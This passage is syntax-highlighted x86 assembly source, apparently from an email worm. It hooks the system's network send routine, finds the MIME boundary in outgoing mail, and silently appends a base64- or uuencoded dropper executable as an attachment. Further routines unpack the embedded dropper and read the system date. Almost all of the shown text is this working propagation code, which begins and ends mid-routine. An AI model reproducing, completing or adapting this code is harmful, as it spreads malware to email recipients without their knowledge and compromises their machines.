       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;copy MIME boundary to buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">boundary</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@@next_b</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@copied</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_b</span><span class="sc0">
  </span><span class="sc5">@@copied</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;now we have all we need for</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;a perfect send :)</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">

  </span><span class="sc5">@@boundary_found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;search for boundary</span><span class="sc0">
  </span><span class="sc5">@@match</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@is_boundary</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;compare stringz</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@match</span><span class="sc0">
  </span><span class="sc5">@@is_boundary</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;edi=end of boundary+1</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">                             </span><span class="sc1">;end reached and all match?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">
       </span><span class="sc6">scasb</span><span class="sc0">                                   </span><span class="sc1">;found last boundary!</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;fix stack</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">                   </span><span class="sc1">;turn to normal boundary</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;subtract buffer address</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;new size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">eax_value2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;save old for return</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">safesend</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;interception point</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'--'</span><span class="sc0">              </span><span class="sc1">;restore user buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">eax_value2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uu_send</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">eax_value2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;how much they want send</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;how much we already send</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@gran_finale</span><span class="sc0">                 </span><span class="sc1">;done</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;send rest</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;starting from last send byte</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">safesend</span><span class="sc0">               </span><span class="sc1">;send the remainder of user buffer</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
  </span><span class="sc5">@@gran_finale</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">boundary</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@@next1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next1</span><span class="sc0">                          </span><span class="sc1">;search end</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;make last boundary</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;calculate the size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">safesend</span><span class="sc0">            </span><span class="sc1">;send last boundary</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">eax_value2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;return no error</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

  </span><span class="sc5">@@bogus</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@scan</span><span class="sc0">                              </span><span class="sc1">;bahh... to far to a loop</span><span class="sc0">
  </span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">oldsend</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">my_send</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">script</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: application/octet-stream; name="'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Disposition: attachment; filename="'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">script_sz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">script</span><span class="sc0">


</span><span class="sc5">uu_send</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">sent</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@already</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">boundary</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@skip_header</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">;work after boundary</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">script</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@expand</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@send_header</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ninsert</span><span class="sc0">                             </span><span class="sc1">;insert exe name</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0">
  </span><span class="sc5">@@name</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@expand</span><span class="sc0">
  </span><span class="sc5">@@send_header</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">safesend</span><span class="sc0">                            </span><span class="sc1">;send mime header</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@fuxkx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64size</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64dropper</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@block</span><span class="sc0">
  </span><span class="sc5">@@skip_header</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">uusize</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">uudropper</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@block</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">                  </span><span class="sc1">;block size=4kb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">@@low</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;send the remainder</span><span class="sc0">
  </span><span class="sc5">@@low</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">safesend</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@fuxkx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@block</span><span class="sc0">                      </span><span class="sc1">;blockz left?</span><span class="sc0">
  </span><span class="sc5">@@fuxkx</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">sent</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
  </span><span class="sc5">@@already</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">uu_send</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">init</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@inited</span><span class="sc0">                     </span><span class="sc1">;we already inited our dropper?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem_temp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@inited</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@over</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">dropper.inc</span><span class="sc0">

  </span><span class="sc5">@@over</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">                     </span><span class="sc1">;unpack dropper data</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_gsystime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">                      </span><span class="sc1">;bh=month</span><span class="sc0">
